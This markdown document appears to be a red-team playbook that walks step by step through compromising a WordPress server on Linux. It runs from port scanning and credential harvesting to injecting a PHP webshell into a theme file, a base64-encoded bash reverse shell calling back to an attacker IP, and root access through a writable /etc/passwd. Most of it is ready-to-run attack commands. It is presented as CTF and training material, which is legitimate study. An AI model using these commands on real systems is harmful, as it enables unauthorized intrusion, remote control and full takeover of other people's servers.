# WordPress-RCE-to-Reverse-Shell-and-Linux-Privilege-Escalation

This attack chain demonstrates a realistic penetration testing scenario against a WordPress site hosted on a Linux server. It begins with network reconnaissance to identify open ports and services, followed by web directory enumeration to discover hidden paths. A steganography extraction reveals credentials from an image, enabling CMS enumeration for usernames and passwords. With valid credentials, PHP code is injected into the WordPress theme for RCE. This RCE is upgraded to a reverse shell, allowing post-exploitation enumeration with LinEnum to identify privilege escalation vectors, culminating in password modification in a writable /etc/passwd for root access. The chain maps to MITRE ATT&CK tactics including Reconnaissance, Initial Access, Execution, and Privilege Escalation, suitable for red team training or CTF walkthroughs.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 8 |
| Execution Time | ~2-4 hours |
| Skill Level | Intermediate-Advanced |
| Complexity | High |
| Impact Level | Critical |

## Attack Flow Visualization

```mermaid
graph TD
    A[Reconnaissance: Port and Directory Scan] --> B[Credential Discovery: Steganography and CMS Enum]
    B --> C[Initial Access: Authenticated Code Injection]
    C --> D[Execution: RCE to Reverse Shell]
    D --> E[Discovery: Privilege Escalation Paths]
    E --> F[Privilege Escalation: Modify /etc/passwd]
    F --> G[Objective: Root Access Achieved]
    
    style A fill:#3498db
    style B fill:#9b59b6
    style C fill:#e74c3c
    style D fill:#f39c12
    style E fill:#34495e
    style F fill:#e67e22
    style G fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/Nmap]] for port scanning
- [[tools/Wfuzz]] for directory brute-forcing
- [[tools/Steghide]] for steganography extraction
- [[tools/WPScan]] and [[tools/CeWL]] for CMS enumeration
- [[tools/LinEnum]] for Linux enumeration
- Python 3 for hosting payloads

### Target Environment

- Linux-based web server hosting WordPress
- Open ports for HTTP/HTTPS (80/443) and others
- Network connectivity from attacker machine
- Image file with embedded credentials accessible via web

### Initial Access Requirements

- No initial credentials required; relies on exposed services and weak configurations
- Attacker must have network access to the target IP
- Valid WordPress admin credentials obtained via enumeration for code injection

## Detailed Attack Procedures

### Step 1: Perform Thorough Port Scan
procedure: [[procedures/thorough-port-scan-with-service-enumeration]]

**Objective**: Identify open ports, services, and versions on the target to discover the web server and potential attack surfaces.

**Instructions**: Start with a basic SYN scan on common ports using [[commands/nmap-scan-with-service-enumeration]]:

```bash
nmap -sV $_TARGET_IP -oN initial_scan.txt
```

Follow with UDP scanning using [[commands/nmap-udp-scan-with-service-enumeration]]:

```bash
nmap -sU -sV $_TARGET_IP -oN udp_scan.txt
```

Finally, conduct a full TCP port scan with [[commands/nmap-full-port-scan-with-service-enumeration]]:

```bash
nmap -sV -p- $_TARGET_IP -oN full_scan.txt
```

**Expected Output**: List of open ports (e.g., 80/tcp open http Apache httpd), services, and versions indicating a web server.

**Success Indicators**:
- Web service (HTTP/HTTPS) detected on port 80/443
- No firewalls blocking scans

### Step 2: Brute Force Web Directories
procedure: [[procedures/directory-brute-force-on-web-app-with-wfuzz]]

**Objective**: Discover hidden directories and files on the web application to identify administrative interfaces or sensitive endpoints.

**Instructions**: Use [[commands/wfuzz-directory-brute-force]] with a wordlist to fuzz directories:

```bash
wfuzz --hc 404 -c -w $_WORDLIST -u http://$_TARGET_IP/FUZZ
```

Focus on common paths like /wp-admin/ or /admin/.

**Expected Output**: Responses with status codes other than 404, such as 200 for index.html or 301 for redirects to /wp-admin/.

**Success Indicators**:
- Discovery of /wp-admin/ or WordPress directories
- Identification of image files for further analysis

### Step 3: Extract Hidden Credentials from Image
procedure: [[procedures/extract-hidden-file-from-image-with-steghide]]

**Objective**: Use steganography tools to extract embedded credentials from an accessible image file on the web server.

**Instructions**: Download the image (e.g., wallpaper.jpg) from the discovered directory. Then extract with [[commands/steghide-extract-hidden-file-in-image]]:

```bash
steghide extract -sf $_IMAGE_FILE
```

Enter the passphrase (e.g., 'secret') when prompted.

**Expected Output**: Extraction of a file like id_rsa.pub or a credentials text file containing usernames/passwords.

**Success Indicators**:
- Successful extraction without errors
- Valid credentials or keys obtained

### Step 4: Enumerate CMS for Credentials
procedure: [[procedures/enumerate-web-cms-for-usernames-and-passwords]]

**Objective**: Crawl the site, search for keywords, generate wordlists, and enumerate WordPress users/plugins to build credential lists.

**Instructions**: Crawl the site with [[commands/wget-crawl-web-app-recursively]]:

```bash
wget --recursive --html-extension --convert-links --restrict-file-names=windows --no-parent http://$_TARGET_IP
```

Search for keywords like 'password' using [[commands/grep-search-files-for-keywords]]:

```bash
grep -C 5 -iR 'password|secret|admin' *
```

Generate a custom wordlist with [[commands/cewl-generate-password-list-from-website-content]]:

```bash
cewl $_TARGET_IP -d 2 -m 5 -w passwords.txt
```

Mutate the wordlist with [[commands/hashcat-mutate-wordlist-with-alphanumeric-characters]]:

```bash
hashcat -a 6 --stdout passwords.txt ?a?a > mutated_passwords.txt
```

Enumerate WordPress specifics with [[commands/wpscan-enumerate-wordpress-plugins-users-themes-timthumb]]:

```bash
wpscan --url http://$_TARGET_IP --enumerate p,t,u,tt
```

**Expected Output**: Lists of usernames (e.g., admin), potential passwords, and vulnerable plugins.

**Success Indicators**:
- Usernames enumerated (e.g., via WPScan)
- Viable password candidates generated

### Step 5: Inject PHP Code into WordPress
procedure: [[procedures/add-and-execute-php-code-on-wordpress-site-authenticated]]

**Objective**: Use obtained credentials to log in and inject a PHP webshell into the theme for RCE.

**Instructions**: Log in to /wp-admin/ with enumerated credentials. Navigate to Appearance > Theme Editor, select header.php, and append the webshell code from [[codes/php-simple-webshell-for-command-execution]]. Update the file. Access via URL like http://$_TARGET_IP/?cmd=whoami.

**Expected Output**: Command output in browser, e.g., 'www-data' as the executing user.

**Success Indicators**:
- No errors on file update
- Commands execute successfully via URL parameter

### Step 6: Upgrade RCE to Reverse Shell
procedure: [[procedures/upgrade-website-rce-to-reverse-shell-on-linux]]

**Objective**: Leverage the webshell to establish a persistent reverse shell for interactive access.

**Instructions**: Encode the reverse shell payload from [[codes/bash-tcp-reverse-shell]] using [[commands/base64-encode-a-command]]:

```bash
echo -n 'bash -i >& /dev/tcp/$_ATTACKER_IP/$_PORT 0>&1' | base64 -w 0
```

Execute via webshell: echo <encoded> | base64 -d | bash. Alternatively, host the shell script with [[commands/python3-launch-simple-http-server]] on attacker machine and wget/execute it via webshell.

**Expected Output**: Connection to listener (e.g., nc -lvnp $_PORT) with shell prompt.

**Success Indicators**:
- Reverse shell connects back
- Basic commands like id execute on target

### Step 7: Enumerate Privilege Escalation Vectors
procedure: [[procedures/enumerate-linux-privilege-escalation-paths-with-linenum]]

**Objective**: Scan the Linux system for misconfigurations, SUID binaries, and writable files to identify priv-esc paths.

**Instructions**: Transfer LinEnum.sh to target via the shell. Run basic scan with [[commands/linenum-basic-scan-for-vulnerabilities]]:

```bash
./LinEnum.sh
```

Follow with thorough scan using [[commands/linenum-thorough-filesystem-scan]]:

```bash
./LinEnum.sh -t 1
```

**Expected Output**: Report highlighting writable /etc/passwd, SUID files, cron jobs, etc.

**Success Indicators**:
- Writable /etc/passwd identified
- Potential escalation vectors listed

### Step 8: Escalate via Writable /etc/passwd
procedure: [[procedures/change-password-in-writable-etc-passwd]]

**Objective**: Modify a user's password hash in /etc/passwd to gain elevated access, achieving root privileges.

**Instructions**: Generate a password hash (e.g., using mkpasswd). Edit /etc/passwd with vi or echo, replacing the hash for a user like root. su to the user with the new password.

**Expected Output**: Successful su to root prompt.

**Success Indicators**:
- Password change accepted
- Root shell obtained

## Attack Chain Summary

### Key Achievements

- Network and web reconnaissance completed
- Credentials extracted via steganography and enumeration
- RCE achieved through WordPress injection
- Reverse shell established for persistence
- Privilege escalation to root via system manipulation

---

*Last updated: 2023-05-29T16:48:53.162677+00:00*
